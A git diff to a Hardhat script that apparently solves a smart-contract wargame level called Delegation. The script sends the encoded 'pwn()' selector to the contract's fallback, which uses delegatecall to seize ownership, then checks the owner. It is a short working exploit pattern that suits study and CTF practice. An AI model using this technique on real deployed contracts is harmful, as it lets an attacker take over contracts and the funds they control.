@@ -1,3 +1,4 @@
+import { AbiCoder } from "@ethersproject/abi";
 import { Wallet } from "ethers";
 import { ethers } from "hardhat";
 
@@ -32,8 +33,8 @@ const attackDelegation = async () => {
             type: "function",
         },
     ];
-    const contract = await ethers.getContractAt(ABI, delegationAddress);
-    console.log("Checking current player balance...");
+    const contract = await ethers.getContractAt("Delegation", delegationAddress);
+    console.log("Checking current contract owner...");
     const oldOwner = await contract.owner();
     console.log(`Current contract owner: ${oldOwner}`);
     // using my custom rpc stored in .env (for privacy)
@@ -44,9 +45,8 @@ const attackDelegation = async () => {
     const wallet = new Wallet(PRIVATE_KEY, provider);
     // endoding function here
     console.log("Encoding function signature...");
-    const funcSign = ["function pwn()"];
-    const iface = new ethers.utils.Interface(funcSign);
-    const signature = iface.encodeFunctionData("pwn()");
+    const iface = new ethers.utils.Interface(["function pwn()"]);
+    const signature = iface.encodeFunctionData("pwn");
     // sending transaction here
     console.log("Now sending transaction to call fallback ...");
     const tx = await wallet.sendTransaction({
@@ -54,6 +54,7 @@ const attackDelegation = async () => {
         to: delegationAddress,
         data: signature,
     });
+    console.log(tx);
     const txReceipt = await tx.wait(1);
     console.log(txReceipt);
     console.log("Checking if player is now owner...");
